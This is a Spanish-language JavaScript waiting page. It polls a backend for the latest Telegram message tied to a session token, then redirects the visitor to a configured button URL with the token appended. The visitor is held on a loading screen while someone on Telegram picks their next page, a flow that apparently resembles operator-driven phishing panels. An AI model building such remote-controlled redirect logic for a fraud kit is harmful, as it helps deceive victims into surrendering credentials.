const INTERVALO_CONSULTA_MS = 8000;
const URL_API_BACKEND = window.location.origin;
const TOKEN_SOLICITUD = window.localStorage.getItem("sessionToken");

// const cargador = document.getElementById("cargador");
const tituloCargando = document.getElementById("titulo-cargando");
// const estadoCargando = document.getElementById("estado-cargando");

function mostrarError() {
  // estadoCargando.textContent = "No se pudo consultar Telegram. Reintentando...";
}

async function consultarBotones() {
  const respuesta = await fetch(`${URL_API_BACKEND}/api/buttons`, {
    headers: { Accept: "application/json" },
    cache: "no-store",
  });
  if (!respuesta.ok) {
    throw new Error(`El servicio de botones respondió con estado ${respuesta.status}`);
  }

  const catalogo = await respuesta.json();
  if (!Array.isArray(catalogo?.data)) {
    throw new Error("El catálogo de botones no tiene el formato esperado");
  }
  return catalogo.data;
}

async function consultarEstado(botones, token) {
  try {
    const urlMensaje = new URL(`${URL_API_BACKEND}/api/telegram/latest-message`);
    urlMensaje.searchParams.set("session_token", token);
    const respuestaMensaje = await fetch(urlMensaje, {
      headers: { Accept: "application/json" },
      cache: "no-store",
    });

    if (!respuestaMensaje.ok) {
      throw new Error(`El servicio de Telegram respondió con estado ${respuestaMensaje.status}`);
    }

    const ultimoMensaje = await respuestaMensaje.json();
    const mensaje = ultimoMensaje?.data === null ? null : ultimoMensaje?.data?.mensaje;
    const messageId = ultimoMensaje?.data?.message_id;
    if (
      mensaje !== null &&
      (typeof mensaje !== "string" || !Number.isSafeInteger(messageId) || messageId < 1)
    ) {
      throw new Error("La respuesta de Telegram no tiene el formato esperado");
    }

    if (typeof mensaje !== "string") {
      // estadoCargando.textContent = "Espera un momento";
      window.setTimeout(() => consultarEstado(botones, token), INTERVALO_CONSULTA_MS);
      return;
    }

    const boton = botones.find((elemento) => elemento?.mensaje === mensaje);

    if (!boton) {
      // estadoCargando.textContent = "Espera un momento";
      window.setTimeout(() => consultarEstado(botones, token), INTERVALO_CONSULTA_MS);
      return;
    }

    if (typeof boton.url !== "string" || !boton.url.trim()) {
      throw new Error("El botón que coincide con el mensaje no tiene una URL configurada");
    }

    const destino = new URL(boton.url, window.location.href);
    if (destino.protocol !== "http:" && destino.protocol !== "https:") {
      throw new Error("La URL del botón debe usar HTTP o HTTPS");
    }

    // Añadir el sessionToken como parámetro de URL
    destino.searchParams.set("sessionToken", token);

    const respuestaUso = await fetch(`${URL_API_BACKEND}/api/telegram/use-message`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ session_token: token, message_id: messageId }),
      cache: "no-store",
    });
    if (!respuestaUso.ok) {
      throw new Error(`El servicio respondió con estado ${respuestaUso.status} al marcar el mensaje como usado`);
    }

    const resultadoUso = await respuestaUso.json();
    if (resultadoUso?.data?.used !== true) {
      // estadoCargando.textContent = "Espera un momento";
      window.setTimeout(() => consultarEstado(botones, token), INTERVALO_CONSULTA_MS);
      return;
    }

    // cargador.hidden = true;
    // tituloCargando.textContent = "Acceso validado";
    // // estadoCargando.textContent = "Continuando...";
     window.location.href = destino.href;
    
  } catch (error) {
    console.error("No se pudo consultar el último mensaje de Telegram:", error);
    mostrarError();
    window.setTimeout(() => consultarEstado(botones, token), INTERVALO_CONSULTA_MS);
  }
}

async function iniciarCarga() {
  if (!TOKEN_SOLICITUD) {
    // estadoCargando.textContent = "No se identificó esta solicitud. Inicia sesión nuevamente.";
    return;
  }

  try {
    const botones = await consultarBotones();
    consultarEstado(botones, TOKEN_SOLICITUD);
  } catch (error) {
    console.error("No se pudo consultar el catálogo de botones:", error);
    // estadoCargando.textContent = "No se pudo cargar el catálogo de botones.";
  }
}

iniciarCarga();